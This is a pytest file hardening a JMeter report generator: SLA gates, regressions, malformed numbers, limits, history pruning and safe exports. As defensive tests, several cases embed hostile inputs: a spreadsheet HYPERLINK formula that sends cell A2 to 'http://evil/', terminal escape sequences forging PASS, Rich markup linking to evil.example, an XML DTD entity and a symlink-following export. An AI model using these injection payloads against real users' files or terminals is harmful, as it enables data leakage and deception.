"""Fourth review round: SLA gates, hostile input, limits, history, atomic exports."""
import os
import zipfile

import pytest

from jmeter_reporter import compare, convert, history, jtl, sla, stats
from jmeter_reporter.errors import ReportError
from jmeter_reporter.safety import printable

HEADER = 'timeStamp,elapsed,label,responseCode,responseMessage,success,bytes\n'


def make(tmp_path, rows, name='a.jtl', header=HEADER):
    path = tmp_path / name
    path.write_text(header + ''.join(rows), encoding='utf-8')
    return str(path)


def full_run(tmp_path, steps=10, name='full.jtl'):
    rows = [f'{1700000000000 + i * 100},100,{i + 1:02d}. step,200,OK,true,10\n'
            for i in range(steps) for _ in range(5)]
    return make(tmp_path, rows, name)


# --- 1. SLA gate: a dead test must not pass -------------------------------------------------

def test_required_steps_missing_is_fail(tmp_path):
    dead = make(tmp_path, ['1700000000000,100,01. login,200,OK,true,10\n'])
    run = stats.load_run(dead)
    ok = sla.evaluate(run, sla.normalize({'p90_ms': 2000, 'required_steps': [r'^01\.']}))
    assert ok.passed
    bad = sla.evaluate(run, sla.normalize({'p90_ms': 2000, 'required_steps': [r'^01\.', r'^02\.']}))
    assert not bad.passed
    assert [r['label'] for r in bad.failed] == [r'^02\.']


def test_required_steps_all_present_passes(tmp_path):
    cfg = sla.normalize({'p90_ms': 2000, 'required_steps': [r'^01\.', r'^10\.']})
    assert sla.evaluate(stats.load_run(full_run(tmp_path)), cfg).passed


def test_min_samples_limit(tmp_path):
    dead = make(tmp_path, ['1700000000000,100,01. login,200,OK,true,10\n'])
    cfg = sla.normalize({'p90_ms': 2000, 'min_samples': 5})
    assert not sla.evaluate(stats.load_run(dead), cfg).passed


def test_required_steps_validation():
    with pytest.raises(ReportError):
        sla.normalize({'required_steps': 'x'})
    with pytest.raises(ReportError):
        sla.normalize({'required_steps': ['(']})


# --- 2. compare: a vanished step is a regression ---------------------------------------------

def test_vanished_step_is_a_regression(tmp_path):
    base = stats.load_run(full_run(tmp_path))
    dead = stats.load_run(make(tmp_path, [
        f'{1700000000000 + i},100,01. step,200,OK,true,10\n' for i in range(5)], 'dead.jtl'))
    cmp = compare.compare_runs(base, dead)
    assert cmp.only_base and cmp.has_regressions
    assert 'ПРОПАЛИ' in compare.format_comparison(cmp)


# --- 3. negative and absurd numbers ----------------------------------------------------------

@pytest.mark.parametrize('elapsed', ['-100000', '-1', '1' * 5000, '10^400', '²'])
def test_bad_elapsed_is_a_clean_error(tmp_path, elapsed):
    path = make(tmp_path, [f'1700000000000,{elapsed},01. a,200,OK,true,5\n'])
    with pytest.raises(ReportError):
        stats.load_run(path)


@pytest.mark.parametrize('value', ['²', '--5', '9' * 5000, '', 'abc'])
def test_optional_numbers_never_raise(value):
    assert jtl.to_int(value) == 0
    assert not jtl.is_int(value) or value == ''  # '' is not an int either
    assert jtl.to_int('42') == 42 and jtl.to_int(' -7 ') == -7


@pytest.mark.parametrize('bytes_value', ['²', '--5', '9' * 5000])
def test_report_survives_hostile_bytes(tmp_path, bytes_value):
    path = make(tmp_path, [f'1700000000000,10,01. a,200,OK,true,{bytes_value}\n'])
    out = tmp_path / 'r.xlsx'
    convert.create_excel_report(path, str(out))
    assert out.exists()


def test_too_many_columns_is_a_clean_error(tmp_path):
    header = ','.join(['timeStamp', 'elapsed', 'label'] + [f'c{i}' for i in range(20000)]) + '\n'
    path = make(tmp_path, ['1,1,a' + ',' * 20000 + '\n'], header=header)
    with pytest.raises(ReportError):
        stats.load_run(path)


# --- 4. formula in a JTL header is text, not a formula --------------------------------------

def test_formula_in_jtl_header_stays_text(tmp_path):
    header = HEADER.rstrip('\n') + ',"=HYPERLINK(""http://evil/""&A2,""x"")"\n'
    path = make(tmp_path, ['1700000000000,10,01. a,200,OK,true,5,v\n'], header=header)
    out = tmp_path / 'r.xlsx'
    convert.create_excel_report(path, str(out))
    with zipfile.ZipFile(out) as z:
        for name in z.namelist():
            if name.startswith('xl/worksheets/sheet'):
                assert '<f>' not in z.read(name).decode('utf-8')


# --- 5. label cap ----------------------------------------------------------------------------

def test_label_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(stats, 'MAX_LABELS', 50)
    path = make(tmp_path, [f'1700000000000,10,GET /order/{i},200,OK,true,5\n' for i in range(60)])
    with pytest.raises(ReportError, match='уникальных меток'):
        stats.load_run(path)


# --- 7/9. terminal and markup safety ----------------------------------------------------------

def test_printable_strips_escape():
    assert printable('x\x1b[2KPASS\r') == 'x?[2KPASS?'


def test_verdict_has_no_escape_bytes(tmp_path):
    path = make(tmp_path, ['1700000000000,5000,01. x\x1b[1A\x1b[2KPASS,200,OK,true,5\n'])
    cfg = sla.normalize({'p90_ms': 10})
    text = sla.format_verdict(sla.evaluate(stats.load_run(path), cfg))
    assert '\x1b' not in text


def test_preview_label_is_not_markup(tmp_path):
    from rich.console import Console
    from jmeter_reporter import preview
    path = make(tmp_path, ['1700000000000,10,[/nope] 01. a,200,OK,true,5\n',
                           '1700000000100,10,[link=https://evil.example]01. b[/link],200,OK,true,5\n'])
    info = preview.summarize_jtl(path)
    Console(record=True, width=100).print(preview.render_summary(info))


# --- 10. XML with entities is refused --------------------------------------------------------

def test_xml_with_entities_is_refused(tmp_path):
    from jmeter_reporter import verify
    bomb = tmp_path / 's.xml'
    bomb.write_text('<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x "y">]><testResults>&x;</testResults>')
    with pytest.raises(ValueError, match='DTD'):
        verify.parse_standard_results(str(bomb))


# --- 12. history is bounded ------------------------------------------------------------------

def test_history_is_pruned(tmp_path):
    out = tmp_path / 'report.xlsx'
    folder = tmp_path / 'history'
    folder.mkdir()
    for i in range(8):
        f = folder / f'report_20260101_0000{i:02d}.xlsx'
        f.write_text('x')
        os.utime(f, (1000 + i, 1000 + i))
    deleted = history.prune(out, keep=3)
    assert len(deleted) == 5
    assert sorted(p.name for p in folder.iterdir()) == [
        'report_20260101_000005.xlsx', 'report_20260101_000006.xlsx', 'report_20260101_000007.xlsx']


# --- 17. exports do not follow symlinks -------------------------------------------------------

@pytest.mark.skipif(os.name == 'nt', reason='symlinks need privileges on Windows')
def test_export_replaces_symlink_not_target(tmp_path):
    from jmeter_reporter import export
    victim = tmp_path / 'victim.txt'
    victim.write_text('keep me')
    link = tmp_path / 'report.csv'
    link.symlink_to(victim)
    export.write_csv(stats.load_run(full_run(tmp_path)), str(link), None)
    assert victim.read_text() == 'keep me'
    assert not link.is_symlink() and 'label' in link.read_text(encoding='utf-8-sig')


# --- 16. --strict-verify ---------------------------------------------------------------------

def test_strict_verify_flag_parses(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    for name in ('a.jtl',):
        open(name, 'w').close()
    args = convert.parse_args(['a.jtl', 'b.xlsx', '--strict-verify'])
    assert args['strict_verify'] is True
    assert convert.parse_args(['a.jtl', 'b.xlsx'])['strict_verify'] is False

